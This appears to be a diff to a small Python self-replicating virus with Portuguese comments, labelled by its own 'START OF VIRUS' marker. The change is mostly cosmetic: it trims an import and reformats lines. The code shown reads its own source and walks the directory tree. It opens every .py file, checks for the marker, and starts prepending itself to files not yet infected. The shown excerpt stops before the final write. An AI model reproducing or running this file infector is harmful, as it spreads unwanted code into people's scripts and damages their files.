@@ -1,8 +1,7 @@
 ### START OF VIRUS ###
 
-import glob
-import sys
 import os
+import sys
 
 code = []
 with open(sys.argv[0], 'r') as f:
@@ -17,18 +16,20 @@ for line in lines:
     if line == '### END OF VIRUS ###\n':
         break
 
-dir_path = os.path.dirname(os.path.realpath(__file__)) # Pega diretorio atual
+dir_path = os.path.dirname(os.path.realpath(__file__))  # Pega diretorio atual
 for root, dirs, files in os.walk(dir_path):
     for file in files:
-        if file.endswith('.py'): # filtra arquivos .py
-            with open(root+'/'+str(file), 'r') as f: # abre cada arquivo com seu caminho inteiro,caso contrário dá erro
+        if file.endswith('.py'):  # filtra arquivos .py
+            with open(root + '/' + str(file),
+                      'r') as f:  # abre cada arquivo com seu caminho inteiro,caso contrário dá erro
                 script_code = f.readlines()
 
-            infected = False 
+            infected = False
             for line in script_code:
                 if line == '### START OF VIRUS ###\n':
                     infected = True
                     break
+
             if not infected:
                 final_code = []
                 final_code.extend(code)
